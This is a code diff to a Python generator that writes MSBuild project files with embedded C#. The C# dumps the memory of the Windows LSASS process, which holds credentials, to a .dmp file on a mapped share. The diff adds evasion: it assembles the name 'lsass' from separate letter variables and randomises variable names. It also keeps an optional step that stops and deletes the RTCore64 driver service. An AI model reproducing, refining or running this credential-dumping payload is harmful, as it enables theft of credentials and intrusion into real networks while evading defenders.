@@ -877,6 +877,7 @@ def gen_payload_msbuild(share_name, payload_name, drive_letter, addresses_array,
     ip = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
     i = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
     thismachinesip = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    returnedout = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
 
     xml_payload = "<Project ToolsVersion=\"4.0\" xmlns=\"http://schemas.microsoft.com/developer/msbuild/2003\">\n"
     xml_payload += "<!-- C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe SimpleTasks.csproj -->\n"
@@ -913,20 +914,6 @@ def gen_payload_msbuild(share_name, payload_name, drive_letter, addresses_array,
         xml_payload += "            return %s;\n" % (myid)
         xml_payload += "        }\n"
 
-    xml_payload += "        public static int %s() {\n" % (GetPID)
-    xml_payload += "            string %s = \"s\";\n" % (s)
-    xml_payload += "            string %s = \"l\";\n" % (l)
-    xml_payload += "            string %s = \"a\";\n" % (a)
-    xml_payload += "            var %s = Process.GetProcessesByName(%s + %s + %s + %s + %s);\n" % (processes, l, s, a, s, s)
-    xml_payload += "            int %s = 0;\n" % (id)
-    xml_payload += "            foreach (var %s in %s)\n" % (process, processes)
-    xml_payload += "            {\n"
-    xml_payload += "                %s = %s.Id;\n" % (id, process)
-    xml_payload += "            }\n"
-
-    xml_payload += "            return %s;\n" % (id)
-    xml_payload += "        }\n"
-
     xml_payload += "        public static bool %s()\n" % (IsAdministrator)
     xml_payload += "        {\n"
     xml_payload += "            return (new WindowsPrincipal(WindowsIdentity.GetCurrent()))\n"
@@ -960,14 +947,18 @@ def gen_payload_msbuild(share_name, payload_name, drive_letter, addresses_array,
         xml_payload += "                Thread.Sleep(1000);\n"
 
     xml_payload += "                string filePath = \"%s:\\\\\" + System.Net.Dns.GetHostName() + %s + \".dmp\";\n" % (drive_letter, thismachinesip)
-    #xml_payload += "                int %s = Process.GetProcessById(%s());\n" % (p, GetPID)
-    xml_payload += "                int t = 0;\n"
-    xml_payload += "                var processes = Process.GetProcessesByName(\"lsass\");\n"
-    xml_payload += "                foreach(var p in processes)\n"
+
+    xml_payload += "                string %s = \"s\";\n" % (s)
+    xml_payload += "                string %s = \"l\";\n" % (l)
+    xml_payload += "                string %s = \"a\";\n" % (a)
+
+    xml_payload += "                int %s = 0;\n" % (id)
+    xml_payload += "                var %s = Process.GetProcessesByName(%s + %s + %s + %s + %s);\n" % (processes, l, s, a, s, s)
+    xml_payload += "                foreach(var %s in %s)\n" % (p, processes)
     xml_payload += "                {\n"
-    xml_payload += "                    t = p.Id;\n"
+    xml_payload += "                    %s = %s.Id;\n" % (id, p)
     xml_payload += "                }\n"
-    xml_payload += "                int returnedout = getthatdmp(t, filePath);\n"
+    xml_payload += "                int %s = getthatdmp(%s, filePath);\n" % (returnedout, id)
     if runasppl:
         xml_payload += "                Process.Start(\"cmd.exe\", @\"/c \" + \"net stop RTCore64\").WaitForExit();\n"
         xml_payload += "                Process.Start(\"cmd.exe\", @\"/c \" + \"sc.exe delete RTCore64\").WaitForExit();\n"
